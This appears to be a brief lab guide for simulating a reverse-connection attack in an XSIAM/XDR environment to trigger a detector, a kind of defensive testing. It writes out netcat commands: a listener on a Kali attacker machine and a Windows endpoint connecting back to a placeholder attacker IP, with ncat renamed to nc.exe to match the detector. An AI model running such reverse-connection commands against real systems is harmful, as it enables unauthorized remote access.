1. In the XSIAM, Make sure there is at least 1 endpoint connected with XDR agent from which you'll simulate the attack, and an attacker machine (Kali-DC1ENV4AKALI01) to catch the connection
2. Download ncat from [nmap.org](https://nmap.org/ncat/) to windows machine
3. Change EXE name to nc.exe as expected by the detector
4. Start a listening port on the attacker machine
user:/$ nc -lp 1337 
5. Run ncat on the windows machine to start a reverse connection to the attacker
c:\> nc <attacker_ip> <listening_port>
